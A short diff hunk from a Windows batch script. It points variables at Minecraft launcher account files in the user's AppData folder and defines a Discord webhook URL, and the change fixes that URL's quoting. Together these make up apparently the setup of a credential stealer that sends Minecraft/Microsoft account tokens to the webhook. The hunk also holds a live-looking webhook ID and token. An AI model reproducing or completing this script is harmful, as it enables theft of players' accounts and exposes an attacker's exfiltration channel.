@@ -5,7 +5,7 @@ set "essential_file=%AppData%\.minecraft\essential\microsoft_accounts.json"
 set "minecraft_file=%AppData%\.minecraft\launcher_accounts_microsoft_store.json"
 
 :: Define the Discord webhook URL
-set "webhook_url="https://discord.com/api/webhooks/1345577260882726982/17LGyKkGMw6pN_6OOu2c6fDfnDebWCVeo814qLDWQSjUQzbaEznGggnCPbeSOxpb57nj"
+set "webhook_url=https://discord.com/api/webhooks/1345577260882726982/17LGyKkGMw6pN_6OOu2c6fDfnDebWCVeo814qLDWQSjUQzbaEznGggnCPbeSOxpb57nj"
 
 :: Initialize variables for missing files
 set "discord_message="
